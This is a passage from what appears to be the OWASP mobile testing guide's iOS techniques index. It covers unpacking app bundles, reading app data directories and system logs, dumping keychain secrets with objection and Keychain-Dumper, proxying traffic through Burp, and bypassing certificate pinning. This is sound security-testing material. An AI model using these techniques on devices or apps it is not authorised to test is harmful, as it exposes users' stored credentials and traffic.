<p>Note that changing this value will break the original signature, so you must re-sign the IPA ( Signing IPA files) to install it on a device that does not have signature validation disabled.</p> <p>This bypass might not work if the application requires capabilities that are specific to modern iPads while your iPhone or iPod is a bit older.</p> <p>Possible values for the property UIDeviceFamily can be found in the Apple Developer documentation.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0057/","title":"MASTG-TECH-0057: Listing Installed Apps","text":"<p>When targeting apps that are installed on the device, you'll first have to figure out the correct bundle identifier of the application you want to analyze. You can use <code>frida-ps -Uai</code> to get all apps (<code>-a</code>) currently installed (<code>-i</code>) on the connected USB device (<code>-U</code>):</p> <pre><code>$ frida-ps -Uai\n PID  Name                 Identifier\n----  -------------------  -----------------------------------------\n6853  iGoat-Swift          OWASP.iGoat-Swift\n6847  Calendar             com.apple.mobilecal\n6815  Mail                 com.apple.mobilemail\n   -  App Store            com.apple.AppStore\n   -  Apple Store          com.apple.store.Jolly\n   -  Calculator           com.apple.calculator\n   -  Camera               com.apple.camera\n</code></pre> <p>It also shows which of them are currently running ( iGoat-Swift for example). Take a note of the \"Identifier\" (bundle identifier: <code>OWASP.iGoat-Swift</code>) and the PID (<code>6853</code>) as you'll need them for further analysis.</p> <p>You can also directly open  Grapefruit and after selecting your iOS device you'll get the list of installed apps.</p> <p></p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0058/","title":"MASTG-TECH-0058: Exploring the App Package","text":"<p>Once you have collected the package name of the application you want to target, you'll want to start gathering information about it. First, retrieve the  iGoat-Swift IPA as explained in  Obtaining and Extracting Apps.</p> <p>You can unzip the IPA using the standard <code>unzip</code> or any other ZIP utility.</p> <pre><code>unzip iGoat-Swift.ipa\n</code></pre> <p>Inside you'll find a <code>Payload</code> folder containing the so-called Application Bundle (.app). The following is an example in the following output, note that it was truncated for better readability and overview:</p> <pre><code>$ ls -1 Payload/iGoat-Swift.app\nrutger.html\nmansi.html\nsplash.html\nabout.html\n\nLICENSE.txt\nSentinel.txt\nREADME.txt\n\nURLSchemeAttackExerciseVC.nib\nCutAndPasteExerciseVC.nib\nRandomKeyGenerationExerciseVC.nib\nKeychainExerciseVC.nib\nCoreData.momd\narchived-expanded-entitlements.xcent\nSVProgressHUD.bundle\n\nBase.lproj\nAssets.car\nPkgInfo\n_CodeSignature\nAppIcon60x60@3x.png\n\nFrameworks\n\nembedded.mobileprovision\n\nCredentials.plist\nAssets.plist\nInfo.plist\n\niGoat-Swift\n</code></pre> <p>The most relevant items are:</p> <ul> <li><code>Info.plist</code> contains configuration information for the application, such as its bundle ID, version number, and display name.</li> <li><code>_CodeSignature/</code> contains a plist file with a signature over all files in the bundle.</li> <li><code>Frameworks/</code> contains the app native libraries as .dylib or .framework files.</li> <li><code>PlugIns/</code> may contain app extensions as .appex files (not present in the example).</li> <li>iGoat-Swift is the app binary containing the app's code. Its name is the same as the bundle's name minus the .app extension.</li> <li>Various resources such as images/icons, <code>*.nib</code> files (storing the user interfaces of iOS app), localized content (<code>&lt;language&gt;.lproj</code>), text files, audio files, etc.</li> </ul>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0058/#the-infoplist-file","title":"The Info.plist File","text":"<p>The information property list or <code>Info.plist</code> (named by convention) is the main source of information for an iOS app. It consists of a structured file containing key-value pairs describing essential configuration information about the app. Actually, all bundled executables (app extensions, frameworks and apps) are expected to have an <code>Info.plist</code> file. You can find all possible keys in the Apple Developer Documentation.</p> <p>The file might be formatted in XML or binary (bplist). You can convert it to XML format with one simple command:</p> <ul> <li>On macOS with <code>plutil</code>, which is a tool that comes natively with macOS 10.2 and above versions (no official online documentation is currently available):</li> </ul> <pre><code>plutil -convert xml1 Info.plist\n</code></pre> <ul> <li>On Linux:</li> </ul> <pre><code>apt install libplist-utils\nplistutil -i Info.plist -o Info_xml.plist\n</code></pre> <p>Here's a non-exhaustive list of some info and the corresponding keywords that you can easily search for in the <code>Info.plist</code> file by just inspecting the file or by using <code>grep -i &lt;keyword&gt; Info.plist</code>:</p> <ul> <li>App permissions Purpose Strings: <code>UsageDescription</code> (see \"iOS Platform APIs\")</li> <li>Custom URL schemes: <code>CFBundleURLTypes</code> (see \"iOS Platform APIs\")</li> <li>Exported/imported custom document types: <code>UTExportedTypeDeclarations</code> / <code>UTImportedTypeDeclarations</code> (see \"iOS Platform APIs\")</li> <li>App Transport Security (ATS) configuration: <code>NSAppTransportSecurity</code> (see \"iOS Network Communication\")</li> </ul> <p>Please refer to the mentioned chapters to learn more about how to test each of these points.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0058/#app-binary","title":"App Binary","text":"<p>iOS app binaries are fat binaries (they can be deployed on all devices 32- and 64-bit). In contrast to Android, where you can actually decompile the app binary to Java code, the iOS app binaries can only be disassembled.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0058/#native-libraries","title":"Native Libraries","text":"<p>iOS apps can make their codebase modular by using different elements. In the MASTG we will refer to all of them as native libraries, but they can come in different forms:</p> <ul> <li>Static and Dynamic Libraries:<ul> <li>Static Libraries can be used and will be compiled in the app binary.</li> <li>Dynamic Libraries (typically having the <code>.dylib</code> extension) are also used but must be part of a framework bundle. Standalone Dynamic Libraries are not supported on iOS, watchOS, or tvOS, except for the system Swift libraries provided by Xcode.</li> </ul> </li> <li>Frameworks (since iOS 8). A Framework is a hierarchical directory that encapsulates a dynamic library, header files, and resources, such as storyboards, image files, and localized strings, into a single package.</li> <li>Binary Frameworks (<code>XCFrameworks</code>): Xcode 11 supports distributing binary libraries using the <code>XCFrameworks</code> format which is a new way to bundle up multiple variants of a Framework, e.g. for any of the platforms that Xcode supports (including simulator and devices). They can also bundle up static libraries (and their corresponding headers) and support binary distribution of Swift and C-based code. <code>XCFrameworks</code> can be distributed as Swift Packages.</li> <li>Swift Packages: Xcode 11 add supports for Swift packages, which are reusable components of Swift, Objective-C, Objective-C++, C, or C++ code that developers can use in their projects and are distributed as source code. Since Xcode 12 they can also bundle resources, such as images, storyboards, and other files. Since Package libraries are static by default. Xcode compiles them, and the packages they depend on, and then links and combines everything into the application.</li> </ul> <p>You can view native libraries in  Grapefruit by clicking on the Modules icon in the left menu bar:</p> <p></p> <p>And get a more detailed view including their imports/exports:</p> <p></p> <p>They are available in the <code>Frameworks</code> folder in the IPA, you can also inspect them from the terminal:</p> <pre><code>$ ls -1 Frameworks/\nRealm.framework\nlibswiftCore.dylib\nlibswiftCoreData.dylib\nlibswiftCoreFoundation.dylib\n</code></pre> <p>or from the device with objection (as well as per SSH of course):</p> <pre><code>OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls\nNSFileType      Perms  NSFileProtection    ...  Name\n------------  -------  ------------------  ...  ----------------------------\nDirectory         493  None                ...  Realm.framework\nRegular           420  None                ...  libswiftCore.dylib\nRegular           420  None                ...  libswiftCoreData.dylib\nRegular           420  None                ...  libswiftCoreFoundation.dylib\n...\n</code></pre> <p>Please note that this might not be the complete list of native code elements being used by the app as some can be part of the source code, meaning that they'll be compiled in the app binary and therefore cannot be found as standalone libraries or Frameworks in the <code>Frameworks</code> folder.</p> <p>For now this is all information you can get about the Frameworks unless you start reverse engineering them. Refer to for more information about how to reverse engineer Frameworks.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0058/#other-app-resources","title":"Other App Resources","text":"<p>It is normally worth taking a look at the rest of the resources and files that you may find in the Application Bundle (.app) inside the IPA as some times they contain additional goodies like encrypted databases, certificates, etc.</p> <p></p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0059/","title":"MASTG-TECH-0059: Accessing App Data Directories","text":"<p>Once you have installed the app, there is further information to explore. Let's go through a short overview of the app folder structure on iOS apps to understand which data is stored where. The following illustration represents the application folder structure:</p> <p></p> <p>On iOS, system applications can be found in the <code>/Applications</code> directory while user-installed apps are available under <code>/private/var/containers/</code>. However, finding the right folder just by navigating the file system is not a trivial task as every app gets a random 128-bit UUID (Universal Unique Identifier) assigned for its directory names.</p> <p>In order to easily obtain the installation directory information for user-installed apps you can follow the following methods:</p> <p>Connect to the terminal on the device and use  ipainstaller to install  iGoat-Swift as follows:</p> <pre><code>iPhone:~ root# ipainstaller -l\n...\nOWASP.iGoat-Swift\n\niPhone:~ root# ipainstaller -i OWASP.iGoat-Swift\n...\nBundle: /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67\nApplication: /private/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app\nData: /private/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693\n</code></pre> <p>Using objection's command <code>env</code> will also show you all the directory information of the app. Connecting to the application with objection is described in  objection for iOS. In this case we're connecting to  iGoat-Swift:</p> <pre><code>OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env\n\nName               Path\n-----------------  -------------------------------------------------------------------------------------------\nBundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app\nCachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches\nDocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents\nLibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library\n</code></pre> <p>As you can see, apps have two main locations:</p> <ul> <li>The Bundle directory (<code>/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/</code>).</li> <li>The Data directory (<code>/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/</code>).</li> </ul> <p>These folders contain information that must be examined closely during application security assessments (for example when analyzing the stored data for sensitive data).</p> <p>Bundle directory:</p> <ul> <li>AppName.app<ul> <li>This is the Application Bundle as seen before in the IPA, it contains essential application data, static content as well as the application's compiled binary.</li> <li>This directory is visible to users, but users can't write to it.</li> <li>Content in this directory is not backed up.</li> <li>The contents of this folder are used to validate the code signature.</li> </ul> </li> </ul> <p>Data directory:</p> <ul> <li>Documents/<ul> <li>Contains all the user-generated data. The application end user initiates the creation of this data.</li> <li>Visible to users and users can write to it.</li> <li>Content in this directory is backed up.</li> <li>The app can disable paths by setting <code>NSURLIsExcludedFromBackupKey</code>.</li> </ul> </li> <li>Library/<ul> <li>Contains all files that aren't user-specific, such as caches, preferences, cookies, and property list (plist) configuration files.</li> <li>iOS apps usually use the <code>Application Support</code> and <code>Caches</code> subdirectories, but the app can create custom subdirectories.</li> </ul> </li> <li>Library/Caches/<ul> <li>Contains semi-persistent cached files.</li> <li>Invisible to users and users can't write to it.</li> <li>Content in this directory is not backed up.</li> <li>The OS may delete this directory's files automatically when the app is not running and storage space is running low.</li> </ul> </li> <li>Library/Application Support/<ul> <li>Contains persistent files necessary for running the app.</li> <li>Invisible to users and users can't write to it.</li> <li>Content in this directory is backed up.</li> <li>The app can disable paths by setting <code>NSURLIsExcludedFromBackupKey</code>.</li> </ul> </li> <li>Library/Preferences/<ul> <li>Used for storing properties that can persist even after an application is restarted.</li> <li>Information is saved, unencrypted, inside the application sandbox in a plist file called [BUNDLE_ID].plist.</li> <li>All the key/value pairs stored using <code>NSUserDefaults</code> can be found in this file.</li> </ul> </li> <li>tmp/<ul> <li>Use this directory to write temporary files that do not need to persist between app launches.</li> <li>Contains non-persistent cached files.</li> <li>Invisible to users.</li> <li>Content in this directory is not backed up.</li> <li>The OS may delete this directory's files automatically when the app is not running and storage space is running low.</li> </ul> </li> </ul> <p>Let's take a closer look at iGoat-Swift's Application Bundle (.app) directory inside the Bundle directory (<code>/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app</code>):</p> <pre><code>OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls\nNSFileType      Perms  NSFileProtection    ...  Name\n------------  -------  ------------------  ...  --------------------------------------\nRegular           420  None                ...  rutger.html\nRegular           420  None                ...  mansi.html\nRegular           420  None                ...  splash.html\nRegular           420  None                ...  about.html\n\nRegular           420  None                ...  LICENSE.txt\nRegular           420  None                ...  Sentinel.txt\nRegular           420  None                ...  README.txt\n\nDirectory         493  None                ...  URLSchemeAttackExerciseVC.nib\nDirectory         493  None                ...  CutAndPasteExerciseVC.nib\nDirectory         493  None                ...  RandomKeyGenerationExerciseVC.nib\nDirectory         493  None                ...  KeychainExerciseVC.nib\nDirectory         493  None                ...  CoreData.momd\nRegular           420  None                ...  archived-expanded-entitlements.xcent\nDirectory         493  None                ...  SVProgressHUD.bundle\n\nDirectory         493  None                ...  Base.lproj\nRegular           420  None                ...  Assets.car\nRegular           420  None                ...  PkgInfo\nDirectory         493  None                ...  _CodeSignature\nRegular           420  None                ...  AppIcon60x60@3x.png\n\nDirectory         493  None                ...  Frameworks\n\nRegular           420  None                ...  embedded.mobileprovision\n\nRegular           420  None                ...  Credentials.plist\nRegular           420  None                ...  Assets.plist\nRegular           420  None                ...  Info.plist\n\nRegular           493  None                ...  iGoat-Swift\n</code></pre> <p>You can also visualize the Bundle directory from  Grapefruit by clicking on Finder -&gt; Bundle:</p> <p></p> <p>Including the <code>Info.plist</code> file:</p> <p></p> <p>As well as the Data directory in Finder -&gt; Home:</p> <p></p> <p>Refer to the Testing Data Storage chapter for more information and best practices on securely storing sensitive data.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0060/","title":"MASTG-TECH-0060: Monitoring System Logs","text":"<p>Many apps log informative (and potentially sensitive) messages to the console log. The log also contains crash reports and other useful information. You can collect console logs through the Xcode Devices window as follows:</p> <ol> <li>Launch Xcode.</li> <li>Connect your device to your host computer.</li> <li>Choose Window -&gt; Devices and Simulators.</li> <li>Click on your connected iOS device in the left section of the Devices window.</li> <li>Reproduce the problem.</li> <li>Click on the Open Console button located in the upper right-hand area of the Devices window to view the console logs on a separate window.</li> </ol> <p></p> <p>To save the console output to a text file, go to the top right side of the Console window and click on the Save button.</p> <p></p> <p>You can also connect to the device shell as explained in  Accessing the Device Shell, install socat via apt-get and run the following command:</p> <pre><code>iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock\n\n========================\nASL is here to serve you\n&gt; watch\nOK\n\nJun  7 13:42:14 iPhone chmod[9705] &lt;Notice&gt;: MS:Notice: Injecting: (null) [chmod] (1556.00)\nJun  7 13:42:14 iPhone readlink[9706] &lt;Notice&gt;: MS:Notice: Injecting: (null) [readlink] (1556.00)\nJun  7 13:42:14 iPhone rm[9707] &lt;Notice&gt;: MS:Notice: Injecting: (null) [rm] (1556.00)\nJun  7 13:42:14 iPhone touch[9708] &lt;Notice&gt;: MS:Notice: Injecting: (null) [touch] (1556.00)\n...\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0061/","title":"MASTG-TECH-0061: Dumping KeyChain Data","text":"<p>Dumping the KeyChain data can be done with multiple tools, but not all of them will work on any iOS version. As is more often the case, try the different tools or look up their documentation for information on the latest supported versions.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0061/#objection-jailbroken-non-jailbroken","title":"Objection (Jailbroken / non-Jailbroken)","text":"<p>The KeyChain data can easily be viewed using Objection. First, connect objection to the  iGoat-Swift app as described in \"Recommended Tools - Objection\". Then, use the <code>ios keychain dump</code> command to get an overview of the keychain:</p> <pre><code>$ objection --gadget=\"iGoat-Swift\" explore\n... [usb] # ios keychain dump\n...\nNote: You may be asked to authenticate using the devices passcode or TouchID\nSave the output by adding `--json keychain.json` to this command\nDumping the iOS keychain...\nCreated                    Accessible                      ACL    Type      Account              Service                     Data\n-------------------------  ------------------------------  -----  --------  -------------------  --------------------------  ----------------------------------------------------------------------\n2019-06-06 10:53:09 +0000  WhenUnlocked                    None   Password  keychainValue        com.highaltitudehacks.dvia  mypassword123\n2019-06-06 10:53:30 +0000  WhenUnlockedThisDeviceOnly      None   Password  SCAPILazyVector      com.toyopagroup.picaboo     (failed to decode)\n2019-06-06 10:53:30 +0000  AfterFirstUnlockThisDeviceOnly  None   Password  fideliusDeviceGraph  com.toyopagroup.picaboo     (failed to decode)\n2019-06-06 10:53:30 +0000  AfterFirstUnlockThisDeviceOnly  None   Password  SCDeviceTokenKey2    com.toyopagroup.picaboo     00001:FKsDMgVISiavdm70v9Fhv5z+pZfBTTN7xkwSwNvVr2IhVBqLsC7QBhsEjKMxrEjh\n2019-06-06 10:53:30 +0000  AfterFirstUnlockThisDeviceOnly  None   Password  SCDeviceTokenValue2  com.toyopagroup.picaboo     CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U=\nOWASP.iGoat-Swift on (iPhone: 12.0) [usb] # quit\n</code></pre> <p>Note that currently, the latest versions of frida-server and objection do not correctly decode all keychain data. Different combinations can be tried to increase compatibility. For example, the previous printout was created with <code>frida-tools==1.3.0</code>, <code>frida==12.4.8</code> and <code>objection==1.5.0</code>.</p> <p>Finally, since the keychain dumper is executed from within the application context, it will only print out keychain items that can be accessed by the application and not the entire keychain of the iOS device.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0061/#grapefruit-jailbroken-non-jailbroken","title":"Grapefruit (Jailbroken / non-Jailbroken)","text":"<p>With  Grapefruit it's possible to access the keychain data of the app you have selected. Inside the Storage section, click on Keychain and you can see a listing of the stored Keychain information.</p> <p></p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0061/#keychain-dumper-jailbroken","title":"Keychain-dumper (Jailbroken)","text":"<p>You can use  Keychain-Dumper to dump the jailbroken device's KeyChain contents. Once you have it running on your device:</p> <pre><code>iPhone:~ root# /tmp/keychain_dumper\n\n(...)\n\nGeneric Password\n----------------\nService: myApp\nAccount: key3\nEntitlement Group: RUD9L355Y.sg.vantagepoint.example\nLabel: (null)\nGeneric Field: (null)\nKeychain Data: SmJSWxEs\n\nGeneric Password\n----------------\nService: myApp\nAccount: key7\nEntitlement Group: RUD9L355Y.sg.vantagepoint.example\nLabel: (null)\nGeneric Field: (null)\nKeychain Data: WOg1DfuH\n</code></pre> <p>In newer versions of iOS (iOS 11 and up), additional steps are necessary. See the README.md for more details. Note that this binary is signed with a self-signed certificate that has a \"wildcard\" entitlement. The entitlement grants access to all items in the Keychain. If you are paranoid or have very sensitive private data on your test device, you may want to build the tool from source and manually sign the appropriate entitlements into your build; instructions for doing this are available in the GitHub repository.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0062/","title":"MASTG-TECH-0062: Basic Network Monitoring/Sniffing","text":"<p>You can remotely sniff all traffic in real-time on iOS by creating a Remote Virtual Interface for your iOS device. First make sure you have  Wireshark installed on your macOS host computer.</p> <ol> <li>Connect your iOS device to your macOS host computer via USB.</li> <li>You would need to know the UDID of your iOS device, before you can start sniffing. Check the section \"Obtaining the UDID of an iOS device\" on how to retrieve it. Open the Terminal on macOS and enter the following command, filling in the UDID of your iOS device.</li> </ol> <pre><code>$ rvictl -s &lt;UDID&gt;\nStarting device &lt;UDID&gt; [SUCCEEDED] with interface rvi0\n</code></pre> <ol> <li>Launch Wireshark and select \"rvi0\" as the capture interface.</li> <li>Filter the traffic with Capture Filters in Wireshark to display what you want to monitor (for example, all HTTP traffic sent/received via the IP address 192.168.1.1).</li> </ol> <pre><code>ip.addr == 192.168.1.1 &amp;&amp; http\n</code></pre> <p></p> <p>The documentation of Wireshark offers many examples for Capture Filters that should help you to filter the traffic to get the information you want.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0063/","title":"MASTG-TECH-0063: Setting up an Interception Proxy","text":"<p> Burp Suite is an integrated platform for security testing mobile and web applications. Its tools work together seamlessly to support the entire testing process, from initial mapping and analysis of attack surfaces to finding and exploiting security vulnerabilities. Burp Proxy operates as a web proxy server for Burp Suite, which is positioned as a Machine-in-the-Middle (MITM) between the browser and web server(s). Burp Suite allows you to intercept, inspect, and modify incoming and outgoing raw HTTP traffic.</p> <p>Setting up Burp to proxy your traffic is pretty straightforward. We assume that both your iOS device and host computer are connected to a Wi-Fi network that permits client-to-client traffic. If client-to-client traffic is not permitted, you can use usbmuxd to connect to Burp via USB.</p> <p>PortSwigger provides a good tutorial on setting up an iOS device to work with Burp and a tutorial on installing Burp's CA certificate to an iOS device.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0063/#using-burp-via-usb-on-a-jailbroken-device","title":"Using Burp via USB on a Jailbroken Device","text":"<p>In  Accessing the Device Shell you can learn how to use  iproxy to use SSH via USB. When doing dynamic analysis, it's interesting to use the SSH connection to route our traffic to Burp that is running on our computer. Let's get started:</p> <p>First we need to use iproxy to make SSH from iOS available on localhost.</p> <pre><code>$ iproxy 2222 22\nwaiting for connection\n</code></pre> <p>The next step is to make a remote port forwarding of port 8080 on the iOS device to the localhost interface on our computer to port 8080.</p> <pre><code>ssh -R 8080:localhost:8080 mobile@localhost -p 2222\n</code></pre> <p>You should now be able to reach Burp on your iOS device. Open Safari on iOS and go to 127.0.0.1:8080 and you should see the Burp Suite Page. This would also be a good time to install the CA certificate of Burp on your iOS device.</p> <p>The last step would be to set the proxy globally on your iOS device:</p> <ol> <li>Go to Settings -&gt; Wi-Fi</li> <li>Connect to any Wi-Fi (you can literally connect to any Wi-Fi as the traffic for port 80 and 443 will be routed through USB, as we are just using the Proxy Setting for the Wi-Fi so we can set a global Proxy)</li> <li>Once connected click on the small blue icon on the right side of the connect Wi-Fi</li> <li>Configure your Proxy by selecting Manual</li> <li>Type in 127.0.0.1 as Server</li> <li>Type in 8080 as Port</li> </ol> <p>Open Safari and go to any webpage, you should see now the traffic in Burp. Thanks @hweisheimer for the initial idea!</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0064/","title":"MASTG-TECH-0064: Bypassing Certificate Pinning","text":"<p>Some applications will implement SSL Pinning, which prevents the application from accepting your intercepting certificate as a valid certificate. This means that you will not be able to monitor the traffic between the application and the server.</p> <p>For most applications, certificate pinning can be bypassed within seconds, but only if the app uses the API functions that are covered by these tools. If the app is implementing SSL Pinning with a custom framework or library, the SSL Pinning must be manually patched and deactivated, which can be time-consuming.</p> <p>This section describes various ways to bypass SSL Pinning and gives guidance about what you should do when the existing tools don't work.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0064/#methods-for-jailbroken-and-non-jailbroken-devices","title":"Methods for Jailbroken and Non-jailbroken Devices","text":"<p>If you have a jailbroken device with frida-server installed, you can bypass SSL pinning by running the following  objection command (see  Injecting Frida Gadget into an IPA Automatically if you're using a non-jailbroken device):</p> <pre><code>ios sslpinning disable\n</code></pre> <p>Here's an example of the output:</p> <p></p> <p>See also Objection's help on Disabling SSL Pinning for iOS for further information and inspect the pinning.ts file to understand how the bypass works.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0064/#methods-for-jailbroken-devices-only","title":"Methods for Jailbroken Devices Only","text":"<p>If you have a jailbroken device you can try one of the following tools that can automatically disable SSL Pinning:</p> <ul> <li>\"SSL Kill Switch 2\" is one way to disable certificate pinning. It can be installed via the  Cydia store. It will hook on to all high-level API calls and bypass certificate pinning.</li> <li>The  Burp Suite app can also be used to bypass certificate pinning.</li> </ul>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0064/#when-the-automated-bypasses-fail","title":"When the Automated Bypasses Fail","text":"<p>Technologies and systems change over time, and some bypass techniques might not work eventually. Hence, it's part of the tester work to do some research, since not every tool is able to keep up with OS versions quickly enough.</p> <p>Some apps might implement custom SSL pinning methods, so the tester could also develop new bypass scripts making use of existing ones as a base or inspiration and using similar techniques but targeting the app's custom APIs. Here you can inspect three good examples of such scripts:</p> <ul> <li>\"objection - Pinning Bypass Module\" (pinning.ts)</li> <li>\"Frida CodeShare - ios10-ssl-bypass\" by @dki</li> <li>\"Circumventing SSL Pinning in obfuscated apps with OkHttp\" by Jeroen Beckers</li> </ul> <p>Other Techniques:</p> <p>If you don't have access to the source, you can try binary patching:</p> <ul> <li>If OpenSSL certificate pinning is used, you can try binary patching.</li> <li>Sometimes, the certificate is a file in the application bundle. Replacing the certificate with Burp's certificate may be sufficient, but beware of the certificate's SHA sum. If it's hardcoded into the binary, you must replace it too!</li> <li>If you can access the source code you could try to disable certificate pinning and recompile the app, look for API calls for <code>NSURLSession</code>, <code>CFStream</code>, and <code>AFNetworking</code> and methods/strings containing words like \"pinning\", \"X.509\", \"Certificate\", etc.</li> </ul>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0065/","title":"MASTG-TECH-0065: Reverse Engineering iOS Apps","text":"<p>iOS reverse engineering is a mixed bag. On one hand, apps programmed in Objective-C and Swift can be disassembled nicely. In Objective-C, object methods are called via dynamic function pointers called \"selectors\", which are resolved by name during runtime. The advantage of runtime name resolution is that these names need to stay intact in the final binary, making the disassembly more readable. Unfortunately, this also means that no direct cross-references between methods are available in the disassembler and constructing a flow graph is challenging.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0065/#references","title":"References","text":"<ul> <li>[#miller] - Charlie Miller, Dino Dai Zovi. The iOS Hacker's Handbook. Wiley, 2012 - https://www.wiley.com/en-us/iOS+Hacker%27s+Handbook-p-9781118204122</li> <li>[#levin] Jonathan Levin. Mac OS X and iOS Internals: To the Apple's Core. Wiley, 2013 - http://newosxbook.com/MOXiI.pdf</li> </ul>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0066/","title":"MASTG-TECH-0066: Static Analysis on iOS","text":"<p>The preferred method of statically analyzing iOS apps involves using the original Xcode project files. Ideally, you will be able to compile and debug the app to quickly identify any potential issues with the source code.</p> <p>Black box analysis of iOS apps without access to the original source code requires reverse engineering. For example, no decompilers are available for iOS apps (although most commercial and open-source disassemblers can provide a pseudo-source code view of the binary), so a deep inspection requires you to read assembly code.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0067/","title":"MASTG-TECH-0067: Dynamic Analysis on iOS","text":"<p>Jailbreaking a device simplifies many aspects of dynamic analysis. It provides privileged access and removes code signing restrictions, enabling the use of more powerful tools and techniques. On iOS, most dynamic analysis tools are based on  ElleKit, a framework for developing runtime patches, or Frida, a dynamic introspection tool. For basic API monitoring, you can get away with not knowing all the details of how ElleKit or Frida work - you can simply use existing API monitoring tools.</p> <p>On iOS, collecting basic information about a running process or an application can be slightly more challenging than compared to Android. On Android (or any Linux-based OS), process information is exposed as readable text files via procfs. Thus, any information about a target process can be obtained on a rooted device by parsing these text files. In contrast, on iOS there is no procfs equivalent present. Also, on iOS many standard UNIX command line tools for exploring process information, for instance lsof and vmmap, are removed to reduce the firmware size.</p> <p>In this section, we will learn how to collect process information on iOS using command line tools like lsof. Since many of these tools are not present on iOS by default, we need to install them via alternative methods. For instance, lsof can be installed using  Cydia (the executable is not the latest version available, but nevertheless addresses our purpose).</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0068/","title":"MASTG-TECH-0068: Disassembling Native Code","text":"<p>Because Objective-C and Swift are fundamentally different, the programming language in which the app is written affects the possibilities for reverse engineering it. For example, Objective-C allows method invocations to be changed at runtime. This makes hooking into other app functions (a technique heavily used by Cycript and other reverse engineering tools) easy. This \"method swizzling\" is not implemented the same way in Swift, and the difference makes the technique harder to execute with Swift than with Objective-C.</p> <p>On iOS, all the application code (both Swift and Objective-C) is compiled to machine code (e.g. ARM). Thus, to analyze iOS applications a disassembler is needed.</p> <p>If you want to disassemble an application from the App Store, remove the Fairplay DRM first. See  Obtaining and Extracting Apps for more information.</p> <p>In this context the term \"app binary\" refers to the Macho-O file in the application bundle which contains the compiled code, and should not be confused with the application bundle - the IPA file. See  Exploring the App Package for more details on the composition of IPA files.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0068/#disassembling-with-ida-pro","title":"Disassembling With IDA Pro","text":"<p>If you have a license for IDA Pro, you can analyze the app binary using IDA Pro as well.</p> <p>The free version of IDA unfortunately does not support the ARM processor type.</p> <p>To get started, simply open the app binary in IDA Pro.</p> <p></p> <p>Upon opening the file, IDA Pro will perform auto-analysis, which can take a while depending on the size of the binary. Once the auto-analysis is completed you can browse the disassembly in the IDA View (Disassembly) window and explore functions in the Functions window, both shown in the screenshot below.</p> <p></p> <p>A regular IDA Pro license does not include a decompiler by default and requires an additional license for the Hex-Rays decompiler, which is expensive. In contrast, Ghidra comes with a very capable free builtin decompiler, making it a compelling alternative to use for reverse engineering.</p> <p>If you have a regular IDA Pro license and do not want to buy the Hex-Rays decompiler, you can use Ghidra's decompiler by installing the GhIDA plugin for IDA Pro.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0069/","title":"MASTG-TECH-0069: Decompiling Native Code","text":"<p>TODO. Hopper is only mentioned once in the entire document, ghidra is only used for disassembly, ... We can expand this, maybe add some good ghidra snippets for objective-c mapping, ...</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0070/","title":"MASTG-TECH-0070: Extracting Information from the Application Binary","text":"<p>You can use radare to get information about the binary, such as the architecture, the list of shared libraries, the list of classes and methods, strings and more.</p> <p>Let's use the Damn Vulnerable iOS App DVIA v1 as an example. Open its main binary with radare2:</p> <pre><code>r2 